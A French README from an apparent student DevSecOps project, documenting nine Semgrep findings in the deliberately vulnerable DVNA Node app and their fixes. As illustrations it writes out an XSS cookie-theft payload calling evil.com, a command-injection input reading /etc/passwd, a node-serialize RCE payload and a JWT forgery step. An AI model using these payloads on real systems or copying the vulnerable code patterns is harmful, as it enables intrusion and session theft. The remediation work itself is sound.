# README — Branche `fix/sast` : Corrections SAST (Semgrep)

## Contexte

L'analyse SAST (Static Application Security Testing) a été réalisée avec **Semgrep**
sur le fichier `src/server.js` de DVNA (Damn Vulnerable Node Application).

Semgrep analyse le code source **statiquement** — sans exécuter l'application —
pour détecter des patterns de code dangereux connus.

**Résultat du scan :**
```
File scanned : src/server.js
Findings     : 9
Type         : Blocking (le pipeline s'arrête tant qu'ils ne sont pas corrigés)
```

La branche `fix/sast` corrige chacun des 9 findings un par un.

---

## Les 9 findings Semgrep — Rapport brut

```
Finding 1 : express-cookie-session-default-name     — lignes 28–33
Finding 2 : express-cookie-session-no-domain        — lignes 28–33
Finding 3 : express-cookie-session-no-expires       — lignes 28–33
Finding 4 : express-cookie-session-no-httponly      — lignes 28–33
Finding 5 : express-cookie-session-no-path          — lignes 28–33
Finding 6 : express-cookie-session-no-secure        — lignes 28–33
Finding 7 : express-session-hardcoded-secret        — ligne 29
Finding 8 : detect-child-process                    — ligne 93
Finding 9 : express-third-party-object-deserialization — ligne 135
```

---

## Détail des vulnérabilités et corrections

---

### Finding 1 — `express-cookie-session-default-name`

**Fichier :** `src/server.js` — **Lignes 28–33**
**Règle Semgrep :** `javascript.express.security.audit.express-cookie-settings.express-cookie-session-default-name`

#### Message Semgrep
> Don't use the default session cookie name. Using the default session cookie name
> can open your app to attacks. The security issue posed is similar to X-Powered-By:
> a potential attacker can use it to fingerprint the server and target attacks accordingly.

#### Code vulnérable (lignes 28–33)

```javascript
// src/server.js — lignes 28–33
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  // ← pas de "name" défini
  // → express-session utilise "connect.sid" par défaut
}));
```

#### Explication

Sans nom défini, `express-session` nomme automatiquement le cookie `connect.sid`.
Ce nom est connu de tous les développeurs et attaquants : en voyant `connect.sid`
dans les headers HTTP d'une réponse, un attaquant sait immédiatement que
l'application utilise Express.js et peut cibler des attaques spécifiques à ce framework.
C'est le même principe que la fuite d'information via `X-Powered-By: Express`.

#### Risques

| Risque | Description |
|--------|-------------|
| **Fingerprinting** | L'attaquant identifie la stack technique (Express.js) et adapte ses attaques |
| **Ciblage précis** | Il peut chercher des CVE connues d'Express et les exploiter directement |
| **Facilitation d'autres attaques** | Combiné à d'autres informations, révèle l'architecture complète de l'application |

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — lignes 28–33 (master)
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  // ❌ Pas de "name" → "connect.sid" révèle qu'on utilise Express.js
}));

// APRÈS — fix/sast
app.use(session({
  name: 'dvna.sid',       // ✅ Nom personnalisé, ne révèle plus la stack technique
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { ... }
}));
```

**Pourquoi cette solution :**
Un nom personnalisé comme `dvna.sid` ne révèle aucune information sur le
framework utilisé. Un attaquant ne peut plus identifier la stack à partir
du nom du cookie.

---

### Finding 2 — `express-cookie-session-no-domain`

**Fichier :** `src/server.js` — **Lignes 28–33**
**Règle Semgrep :** `javascript.express.security.audit.express-cookie-settings.express-cookie-session-no-domain`

#### Message Semgrep
> Default session middleware settings: `domain` not set. It indicates the domain
> of the cookie; use it to compare against the domain of the server in which
> the URL is being requested. If they match, then check the path attribute next.

#### Code vulnérable (lignes 28–33)

```javascript
// src/server.js — lignes 28–33
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  // ← pas de "domain" défini
  // → le cookie peut être envoyé à des domaines non prévus
}));
```

#### Explication

Sans `domain` défini, le navigateur applique ses propres règles par défaut
et peut envoyer le cookie à des sous-domaines ou domaines non prévus.
Si un sous-domaine de l'application est compromis, il peut recevoir
le cookie de session et l'exploiter.

#### Risques

| Risque | Description |
|--------|-------------|
| **Fuite vers sous-domaines** | Un sous-domaine compromis peut recevoir le cookie de session |
| **Session Hijacking** | Cookie récupéré sur un domaine non prévu → vol de session |
| **Manque de contrôle** | L'application ne maîtrise pas où son cookie est envoyé |

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — ligne 32 (master)
cookie: { secure: false, httpOnly: false }
// ❌ Pas de "domain" → cookie envoyé sans restriction de domaine

// APRÈS — fix/sast
cookie: {
  secure: true,
  httpOnly: true,
  domain: 'localhost',    // ✅ Cookie restreint au domaine de l'application
  path: '/',
  maxAge: 3600000
}
```

**Pourquoi cette solution :**
En définissant `domain: 'localhost'`, le cookie ne sera envoyé
que pour les requêtes vers ce domaine précis —
aucun autre domaine ou sous-domaine ne peut le recevoir.

---

### Finding 3 — `express-cookie-session-no-expires`

**Fichier :** `src/server.js` — **Lignes 28–33**
**Règle Semgrep :** `javascript.express.security.audit.express-cookie-settings.express-cookie-session-no-expires`

#### Message Semgrep
> Default session middleware settings: `expires` not set.
> Use it to set expiration date for persistent cookies.

#### Code vulnérable (lignes 28–33)

```javascript
// src/server.js — lignes 28–33
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  // ← pas d'"expires" ni de "maxAge" défini
  // → le cookie de session n'expire jamais
}));
```

#### Explication

Sans expiration définie, le cookie de session persiste indéfiniment
dans le navigateur de l'utilisateur. Un cookie volé reste exploitable
pour toujours. Une session ouverte sur un ordinateur public (bibliothèque,
cybercafé) n'est jamais invalidée automatiquement — n'importe qui
peut reprendre la session plus tard.

#### Risques

| Risque | Description |
|--------|-------------|
| **Session permanente** | Un cookie volé reste valide indéfiniment → exploitation sans limite de temps |
| **Ordinateurs partagés** | Session non expirée sur un poste public → accès par un tiers |
| **Fenêtre d'attaque illimitée** | Plus le cookie vit longtemps, plus le risque d'exploitation augmente |

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — ligne 32 (master)
cookie: { secure: false, httpOnly: false }
// ❌ Pas d'expiration → session permanente, jamais invalidée

// APRÈS — fix/sast
cookie: {
  secure: true,
  httpOnly: true,
  maxAge: 3600000,                          // ✅ Expiration après 1 heure (ms)
  expires: new Date(Date.now() + 3600000),  // ✅ Date d'expiration explicite
  domain: 'localhost',
  path: '/'
}
```

**Pourquoi cette solution :**
`maxAge: 3600000` limite la durée de vie du cookie à 1 heure.
Après ce délai, le cookie est automatiquement supprimé par le navigateur
et l'utilisateur doit se reconnecter — limitant drastiquement la fenêtre
d'exploitation en cas de vol de cookie.

---

### Finding 4 — `express-cookie-session-no-httponly`

**Fichier :** `src/server.js` — **Lignes 28–33**
**Règle Semgrep :** `javascript.express.security.audit.express-cookie-settings.express-cookie-session-no-httponly`

#### Message Semgrep
> Default session middleware settings: `httpOnly` not set. It ensures the cookie
> is sent only over HTTP(S), not client JavaScript, helping to protect against
> cross-site scripting attacks.

#### Code vulnérable (lignes 28–33)

```javascript
// src/server.js — lignes 28–33
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  //                        ^^^^^^^^^^^^^^
  //  httpOnly: false → JavaScript côté navigateur peut lire le cookie
}));
```

#### Explication

Avec `httpOnly: false`, le cookie de session est accessible via JavaScript
dans le navigateur (`document.cookie`). Si une faille XSS existe dans l'application
— même mineure — un attaquant peut injecter un script qui lit et envoie
le cookie de session vers son serveur. Il récupère ainsi la session
de la victime sans connaître son mot de passe (Session Hijacking).

#### Risques

| Risque | Description |
|--------|-------------|
| **Session Hijacking via XSS** | Un script malveillant lit `document.cookie` et envoie le cookie à l'attaquant |
| **Vol de session** | L'attaquant se connecte avec la session volée sans connaître le mot de passe |
| **Amplification des failles XSS** | Toute faille XSS devient automatiquement un vol de session possible |

**Scénario d'attaque :**
```
1. Attaquant injecte : <script>fetch('https://evil.com/?c='+document.cookie)</script>
2. La victime visite la page → son cookie de session est envoyé à l'attaquant
3. L'attaquant utilise ce cookie → accès complet à la session de la victime
```

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — ligne 32 (master)
cookie: { secure: false, httpOnly: false }
// ❌ httpOnly: false → JavaScript peut lire le cookie → Session Hijacking possible

// APRÈS — fix/sast
cookie: {
  secure: true,
  httpOnly: true,   // ✅ JavaScript ne peut plus accéder au cookie
  ...
}
```

**Pourquoi cette solution :**
Avec `httpOnly: true`, le navigateur bloque tout accès JavaScript au cookie.
`document.cookie` ne retourne plus le cookie de session.
Même si une faille XSS est exploitée, le cookie de session reste inaccessible.

---

### Finding 5 — `express-cookie-session-no-path`

**Fichier :** `src/server.js` — **Lignes 28–33**
**Règle Semgrep :** `javascript.express.security.audit.express-cookie-settings.express-cookie-session-no-path`

#### Message Semgrep
> Default session middleware settings: `path` not set. It indicates the path
> of the cookie; use it to compare against the request path. If this and domain
> match, then send the cookie in the request.

#### Code vulnérable (lignes 28–33)

```javascript
// src/server.js — lignes 28–33
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  // ← pas de "path" défini
  // → le cookie est envoyé pour toutes les requêtes du domaine
}));
```

#### Explication

Sans `path` défini, le cookie de session est envoyé par le navigateur
pour **toutes** les requêtes vers le domaine, y compris des chemins
qui ne nécessitent pas d'authentification ou des sous-chemins non prévus.
Cela augmente inutilement l'exposition du cookie.

#### Risques

| Risque | Description |
|--------|-------------|
| **Exposition inutile** | Le cookie est envoyé même pour des routes publiques ou statiques |
| **Surface d'attaque élargie** | Chaque requête expose le cookie, multipliant les opportunités d'interception |

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — ligne 32 (master)
cookie: { secure: false, httpOnly: false }
// ❌ Pas de "path" → cookie envoyé pour toutes les requêtes du domaine

// APRÈS — fix/sast
cookie: {
  secure: true,
  httpOnly: true,
  path: '/',    // ✅ Cookie restreint aux requêtes sous "/"
  ...
}
```

**Pourquoi cette solution :**
`path: '/'` est la bonne pratique standard — le cookie est envoyé
pour toutes les routes de l'application (sous `/`) mais pas
pour d'autres chemins ou domaines non définis.

---

### Finding 6 — `express-cookie-session-no-secure`

**Fichier :** `src/server.js` — **Lignes 28–33**
**Règle Semgrep :** `javascript.express.security.audit.express-cookie-settings.express-cookie-session-no-secure`

#### Message Semgrep
> Default session middleware settings: `secure` not set.
> It ensures the browser only sends the cookie over HTTPS.

#### Code vulnérable (lignes 28–33)

```javascript
// src/server.js — lignes 28–33
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  //         ^^^^^^^^^^^^^
  //  secure: false → cookie envoyé même en HTTP non chiffré
}));
```

#### Explication

Avec `secure: false`, le navigateur envoie le cookie de session
même sur des connexions HTTP non chiffrées. Un attaquant positionné
sur le même réseau (Wi-Fi public, réseau d'entreprise, FAI)
peut intercepter le trafic HTTP et lire le cookie en clair.
C'est une attaque Man-in-the-Middle (MitM) classique.

#### Risques

| Risque | Description |
|--------|-------------|
| **Interception en clair** | Sur un Wi-Fi public, l'attaquant capture le cookie en sniffant le trafic HTTP |
| **Man-in-the-Middle (MitM)** | Le cookie intercepté permet de prendre le contrôle de la session |
| **Réseau non sécurisé** | Tout réseau intermédiaire (routeur, proxy) peut lire le cookie |

**Scénario d'attaque :**
```
1. Victime se connecte depuis un Wi-Fi public
2. Attaquant sniffe le trafic HTTP avec Wireshark
3. Il capture le cookie "connect.sid=abc123..." en clair
4. Il rejoue ce cookie dans ses requêtes → accès total à la session
```

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — ligne 32 (master)
cookie: { secure: false, httpOnly: false }
// ❌ secure: false → cookie transmis en HTTP clair → interception MitM possible

// APRÈS — fix/sast
cookie: {
  secure: true,   // ✅ Cookie envoyé uniquement via HTTPS, jamais en HTTP clair
  httpOnly: true,
  ...
}
```

**Pourquoi cette solution :**
Avec `secure: true`, le navigateur refuse d'envoyer le cookie
sur une connexion HTTP non chiffrée. Le cookie ne transite
que via HTTPS — chiffré et protégé contre l'interception réseau.

---

### Bloc complet — Lignes 28–33 AVANT / APRÈS (Findings 1 à 6)

```javascript
// ================================================================
// AVANT — src/server.js lignes 28–33 (branche master)
// 6 findings Semgrep sur ce seul bloc de configuration
// ================================================================
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: false }
  // ❌ Finding 1 : pas de name     → "connect.sid" → fingerprinting
  // ❌ Finding 2 : pas de domain   → fuite vers d'autres domaines
  // ❌ Finding 3 : pas d'expires   → session permanente
  // ❌ Finding 4 : httpOnly: false → vol de cookie via XSS
  // ❌ Finding 5 : pas de path     → cookie exposé sur toutes les routes
  // ❌ Finding 6 : secure: false   → cookie en HTTP clair → MitM
}));

// ================================================================
// APRÈS — src/server.js (branche fix/sast)
// 0 finding sur ce bloc
// ================================================================
app.use(session({
  name: 'dvna.sid',                          // ✅ Finding 1 : nom personnalisé
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,                            // ✅ Finding 6 : HTTPS uniquement
    httpOnly: true,                          // ✅ Finding 4 : inaccessible via JS
    sameSite: 'strict',
    maxAge: 3600000,                         // ✅ Finding 3 : expiration 1 heure
    expires: new Date(Date.now() + 3600000), // ✅ Finding 3 : date explicite
    path: '/',                               // ✅ Finding 5 : chemin restreint
    domain: 'localhost'                      // ✅ Finding 2 : domaine restreint
  }
}));
```

---

### Finding 7 — `express-session-hardcoded-secret`

**Fichier :** `src/server.js` — **Ligne 29**
**Règle Semgrep :** `javascript.express.security.audit.express-session-hardcoded-secret.express-session-hardcoded-secret`

#### Message Semgrep
> A hard-coded credential was detected. It is not recommended to store credentials
> in source-code, as this risks secrets being leaked and used by either an internal
> or external malicious adversary. It is recommended to use environment variables
> to securely provide credentials or retrieve credentials from a secure vault or HSM.

#### Code vulnérable (ligne 29)

```javascript
// src/server.js — ligne 29
  secret: JWT_SECRET,

// JWT_SECRET était défini en dur plus haut dans le fichier :
const JWT_SECRET = 'supersecretkey123';
// ← valeur secrète écrite directement dans le code source
// ← visible par tout le monde sur GitHub
```

#### Explication

`JWT_SECRET` est la clé utilisée pour signer et vérifier les tokens JWT
ainsi que les cookies de session Express. Si cette valeur est dans le code,
elle est versionnée sur GitHub et visible par n'importe qui.
Un attaquant peut s'en servir pour signer ses propres tokens JWT
et se connecter en tant qu'administrateur sans aucun mot de passe.

#### Risques

| Risque | Description |
|--------|-------------|
| **Forge de token JWT** | Avec le secret, l'attaquant génère un token `admin` valide sans connaître de mot de passe |
| **Élévation de privilèges** | Il crée un token avec le rôle `admin` et accède à toutes les routes protégées |
| **Persistance dans Git** | Même si supprimé du code, le secret reste dans l'historique Git et est récupérable |
| **Compromission totale** | Tous les utilisateurs et toutes les sessions sont compromis |

**Scénario d'attaque :**
```
1. Attaquant voit dans GitHub : const JWT_SECRET = 'supersecretkey123'
2. Il génère un token forgé :
   jwt.sign({ id: 1, role: 'admin' }, 'supersecretkey123')
3. Il l'envoie dans ses requêtes HTTP
4. Le serveur accepte → accès admin complet sans mot de passe
```

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — en haut de server.js (master)
const JWT_SECRET = 'supersecretkey123';
// ❌ Secret hardcodé → visible sur GitHub → forge de JWT possible

// APRÈS — fix/sast
const JWT_SECRET    = process.env.JWT_SECRET    || 'changeme-in-prod';
const ADMIN_API_KEY = process.env.ADMIN_API_KEY || 'changeme-in-prod';
// ✅ Secrets lus depuis les variables d'environnement
// ✅ Aucune valeur sensible dans le code source
// ✅ Fichier .env sur le serveur, exclu de Git via .gitignore
```

**Pourquoi cette solution :**
`process.env.JWT_SECRET` lit la valeur depuis l'environnement du serveur
au moment de l'exécution — jamais dans le code. Le dépôt GitHub
ne contient plus aucun secret exploitable.

---

### Finding 8 — `detect-child-process`

**Fichier :** `src/server.js` — **Ligne 93**
**Règle Semgrep :** `javascript.lang.security.detect-child-process.detect-child-process`

#### Message Semgrep
> Detected calls to child_process from a function argument `req`. This could lead
> to a command injection if the input is user controllable. Try to avoid calls to
> child_process, and if it is needed ensure user input is correctly sanitized or sandboxed.

#### Code vulnérable (ligne 93)

```javascript
// src/server.js — ligne 93
exec(`ping -n 2 ${host}`, (err, stdout, stderr) => {
// "host" vient de req (donnée envoyée par l'utilisateur)
// exec() passe la commande complète au shell système pour exécution
// → les caractères spéciaux du shell sont interprétés
```

#### Explication

`exec()` de Node.js passe la commande à `/bin/sh -c "..."` —
c'est-à-dire qu'un shell interprète la chaîne entière.
Si `host` contient des caractères spéciaux comme `&&`, `;`, `|`,
le shell les interprète comme des séparateurs de commandes
et exécute ce qui suit. Un attaquant peut ainsi exécuter
n'importe quelle commande sur le serveur (Remote Code Execution).

#### Risques

| Risque | Description |
|--------|-------------|
| **Remote Code Execution (RCE)** | L'attaquant exécute des commandes arbitraires sur le serveur |
| **Vol de données** | `cat /etc/passwd`, lecture de fichiers de configuration, clés SSH |
| **Prise de contrôle** | Installation d'un backdoor, création d'un utilisateur admin système |
| **Destruction** | Suppression de fichiers, formatage de disque |

**Scénario d'attaque :**
```
Requête normale :
  POST /ping   body: host=8.8.8.8
  → exec("ping -n 2 8.8.8.8")  ✅ OK

Requête malveillante :
  POST /ping   body: host=8.8.8.8 && cat /etc/passwd
  → exec("ping -n 2 8.8.8.8 && cat /etc/passwd")
  → Le shell exécute les deux commandes
  → Retourne le contenu de /etc/passwd à l'attaquant  ❌ RCE
```

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — ligne 93 (master)
exec(`ping -n 2 ${host}`, (err, stdout, stderr) => {
// ❌ exec() avec données utilisateur → RCE possible via injection de commande

// APRÈS — fix/sast
// Fonctionnalité complètement désactivée — exec() supprimé
app.post('/ping', requireAuth, (req, res) => {
  return res.render('ping', {
    user:   req.session.user,
    result: 'Fonctionnalité désactivée pour raisons de sécurité',
    error:  null
  });
});
```

**Pourquoi cette solution :**
La suppression complète de `exec()` est le choix le plus sûr.
Toute validation d'entrée peut être contournée par un attaquant suffisamment
créatif. Si la fonctionnalité ping était nécessaire en production,
la bonne approche serait `execFile('ping', ['-n', '2', host])`
qui passe les arguments directement au programme sans shell interpréteur
— les caractères spéciaux ne sont alors plus interprétés.

---

### Finding 9 — `express-third-party-object-deserialization`

**Fichier :** `src/server.js` — **Ligne 135**
**Règle Semgrep :** `javascript.express.security.audit.express-third-party-object-deserialization.express-third-party-object-deserialization`

#### Message Semgrep
> The following function call `serialize.unserialize` accepts user controlled data
> which can result in Remote Code Execution (RCE) through Object Deserialization.
> It is recommended to use secure data processing alternatives such as
> `JSON.parse()` and `Buffer.from()`.

#### Code vulnérable (ligne 135)

```javascript
// src/server.js — ligne 135
const data = serialize.unserialize(req.body.payload);
// "req.body.payload" = donnée envoyée par l'utilisateur via HTTP POST
// serialize.unserialize() utilise eval() en interne
// → toute fonction JavaScript dans le payload est exécutée directement
```

#### Explication

La librairie `node-serialize` utilise `eval()` en interne pour
reconstruire les objets JavaScript sérialisés, y compris les fonctions.
Si un attaquant envoie un payload contenant une fonction auto-invoquée
(IIFE — Immediately Invoked Function Expression), cette fonction
est automatiquement exécutée côté serveur au moment de la désérialisation.
C'est la vulnérabilité **CVE-2017-5941** — Remote Code Execution (RCE).

#### Risques

| Risque | Description |
|--------|-------------|
| **Remote Code Execution (RCE)** | L'attaquant exécute du code JavaScript arbitraire sur le serveur |
| **Contrôle total du serveur** | Lecture de fichiers, exécution de commandes, installation de backdoor |
| **CVE-2017-5941 (CRITICAL)** | Vulnérabilité connue et documentée, exploit public disponible |
| **Aucune validation possible** | Le code s'exécute pendant la désérialisation, avant tout contrôle |

**Scénario d'attaque (CVE-2017-5941) :**
```javascript
// Payload malveillant envoyé dans req.body.payload :
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()"}

// node-serialize voit "_$$ND_FUNC$$_" → reconnaît une fonction
// → eval() exécute la fonction → exec('whoami') s'exécute sur le serveur
// → L'attaquant reçoit le résultat → RCE confirmé
```

#### Correction appliquée dans `fix/sast`

```javascript
// AVANT — ligne 135 (master)
const data = serialize.unserialize(req.body.payload);
// ❌ unserialize() utilise eval() → RCE via payload IIFE malveillant (CVE-2017-5941)

// APRÈS — fix/sast
app.post('/deserialize', requireAuth, (req, res) => {
  try {
    const data = JSON.parse(req.body.payload);
    // ✅ JSON.parse() traite uniquement des données JSON pures
    // ✅ Impossible d'exécuter du code avec JSON.parse()
    // ✅ Les fonctions et IIFE sont ignorées ou provoquent une erreur
    res.render('deserialize', { user: req.session.user, result: JSON.stringify(data) });
  } catch (e) {
    res.render('deserialize', { user: req.session.user, result: 'Erreur: ' + e.message });
  }
});
```

**Pourquoi cette solution :**
`JSON.parse()` est un parser de données pur — il ne peut traiter que
des types JSON valides (strings, numbers, arrays, objects, booleans, null).
Il n'utilise jamais `eval()` et ne peut pas exécuter de code.
Un payload contenant une IIFE provoque une erreur de parsing, jamais une exécution.
La suppression de `node-serialize` élimine aussi la CVE-2017-5941
qui sera confirmée à l'étape SCA.

---

## Bilan complet — 9 findings AVANT / APRÈS

| # | Finding Semgrep | Ligne | Vulnérabilité | Risque principal | Correction |
|---|-----------------|-------|---------------|------------------|------------|
| 1 | `default-name` | 28–33 | Cookie nommé `connect.sid` | Fingerprinting → attaques ciblées | `name: 'dvna.sid'` |
| 2 | `no-domain` | 28–33 | Pas de restriction de domaine | Fuite cookie vers sous-domaines | `domain: 'localhost'` |
| 3 | `no-expires` | 28–33 | Cookie permanent | Cookie volé exploitable à vie | `maxAge: 3600000` |
| 4 | `no-httponly` | 28–33 | `httpOnly: false` | Vol de cookie via XSS | `httpOnly: true` |
| 5 | `no-path` | 28–33 | Pas de restriction de chemin | Cookie exposé sur toutes routes | `path: '/'` |
| 6 | `no-secure` | 28–33 | `secure: false` | Interception en HTTP clair (MitM) | `secure: true` |
| 7 | `hardcoded-secret` | 29 | JWT_SECRET dans le code | Forge de tokens JWT → accès admin | `process.env.JWT_SECRET` |
| 8 | `detect-child-process` | 93 | `exec()` avec input utilisateur | Command Injection → RCE | Fonctionnalité désactivée |
| 9 | `object-deserialization` | 135 | `serialize.unserialize()` | RCE via CVE-2017-5941 | `JSON.parse()` |

---

## Résultat après correction

```
Semgrep scan — branche fix/sast

Findings Blocking : 0   ✅
Pipeline Jenkins  : PASS → continue vers Stage 4 (SCA)
```

---

## Principe DevSecOps appliqué — Shift Left Security

> En corrigeant ces 9 vulnérabilités directement dans le code source (SAST),
> **avant le build et le déploiement**, on applique le principe fondamental
> du DevSecOps : **intégrer la sécurité le plus tôt possible dans le cycle**.
>
> Une vulnérabilité corrigée au stade du code coûte en moyenne **30x moins cher**
> qu'une vulnérabilité découverte et corrigée en production.

**Règle du pipeline Jenkins :**
Si Semgrep détecte au moins 1 finding de type `Blocking`,
le pipeline s'arrête à la **Stage 3 (SAST)** — le code ne progresse pas
vers les étapes suivantes (SCA, Image Scan, IaC, DAST).

---

*Projet PFE DevSecOps — DVNA Pipeline Jenkins*
*Branche : `fix/sast` | Outil : Semgrep | Findings : 9 → 0 | Date : 2026*
